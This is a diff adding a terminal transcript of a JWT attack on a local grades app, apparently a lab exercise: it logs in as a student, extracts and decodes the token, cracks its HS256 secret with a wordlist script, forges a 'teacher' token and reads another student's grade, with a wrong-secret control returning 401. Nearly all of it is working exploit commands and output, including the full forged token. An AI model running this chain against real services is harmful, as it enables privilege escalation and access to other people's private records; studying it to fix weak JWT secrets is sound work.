@@ -1,0 +1,57 @@
+$ curl -k -s -c /tmp/alice-cookies.txt -X POST https://localhost/login \
+  -d "username=alice" -d "password=alicepw" -o /dev/null \
+  -w "HTTP %{http_code} -> %{redirect_url}\n"
+HTTP 302 -> https://localhost/
+
+$ curl -k -s -b /tmp/alice-cookies.txt https://localhost/dashboard \
+  -o /tmp/notesapp-dashboard.html
+
+
+$ grep -o 'const TOKEN = "[^"]*"' /tmp/notesapp-dashboard.html \
+  | cut -d'"' -f2 > /tmp/alice.jwt
+
+
+$ python3 - <<'PY'
+import base64, json
+tok = open('/tmp/alice.jwt').read().strip()
+head, payload, sig = tok.split('.')
+d = lambda s: json.loads(base64.urlsafe_b64decode(s + '=' * (-len(s) % 4)))
+print('HEADER :', d(head))
+print('PAYLOAD:', d(payload))
+print('SIG    :', sig[:12], '...')
+PY
+HEADER : {'alg': 'HS256', 'typ': 'JWT'}
+PAYLOAD: {'user_id': 6, 'username': 'alice', 'role': 'student'}
+SIG    : U-mti4NnT0VY ...
+
+$ python3 jwt/crack_jwt.py /tmp/alice.jwt jwt/jwt-secrets.txt
+CRACKED — the secret is: 's3cr3t'
+
+$ python3 jwt/forge_hs256.py s3cr3t
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo5OTk5LCJ1c2VybmFtZSI6ImF0dGFja2VyIiwicm9sZSI6InRlYWNoZXIifQ.TfusWdfJDhIKLtdS5IvZ05Qq3rwydmwiVusw41O-ce4
+
+$ curl -k -s -w "\nHTTP %{http_code}\n" https://localhost/api/notes/3 \
+  -H "Authorization: Bearer $SIGNED"
+{
+  "class_id": 1,
+  "class_name": "Mathematics",
+  "comment": "Solid work, keep it up.",
+  "grade": 12.6,
+  "id": 3,
+  "student": "bob",
+  "student_id": 7
+}
+
+HTTP 200
+
+$ python3 jwt/forge_hs256.py wrong-secret
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo5OTk5LCJ1c2VybmFtZSI6ImF0dGFja2VyIiwicm9sZSI6InRlYWNoZXIifQ.47NsJ2capHTL_zJ4rCFqJeEURD2S6vjclx1tvwArJbc
+
+$ curl -k -s -w "\nHTTP %{http_code}\n" https://localhost/api/notes/3 \
+  -H "Authorization: Bearer $WRONG"
+{
+  "error": "unauthorized"
+}
+
+HTTP 401
+
